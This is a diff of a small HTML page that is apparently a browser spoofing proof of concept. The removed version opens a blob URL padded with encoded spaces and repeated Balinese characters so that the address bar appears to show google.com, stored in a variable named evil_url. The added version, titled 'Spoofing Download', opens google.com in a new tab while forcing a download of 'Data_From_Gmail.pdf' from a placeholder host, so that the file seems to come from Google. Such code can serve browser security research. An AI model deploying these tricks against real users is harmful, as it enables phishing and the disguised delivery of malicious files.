@@ -1,17 +1,25 @@
-<body >
+<html>
+  <head>
+    <title>Spoofing Download</title>
+  </head>
+  <body>
+    <button id="openTabButton">Download File Email</button>
+    <script>
+      
+      const openTabButton = document.getElementById('openTabButton');
 
-</body>
-<script>
-var haha = function(){
+openTabButton.addEventListener('click', () => {
+        
+ window.open('https://www.google.com/', '_blank');
 
+        const link = document.createElement('a');
+        link.href = 'https://Website.com/Data_From_Gmail.pdf';
+        link.download = 'Data_From_Gmail.pdf';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      });
 
-  args = ['<title>www.google.com</title>', '<html><h1>Click Site Information<\/h1><\/html>'];
- 
-  b = new Blob(args, {type: 'text/html'});
-  //evil_url = URL.createObjectURL(b) + '#' +'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
-  //evil_url = URL.createObjectURL(b) + '#' +'%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
-  evil_url = URL.createObjectURL(b) + '#' +'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
-  window.open(evil_url);
-};
-</script>
-<button onclick='haha()'>click me</button>
+    </script>
+  </body>
+</html>
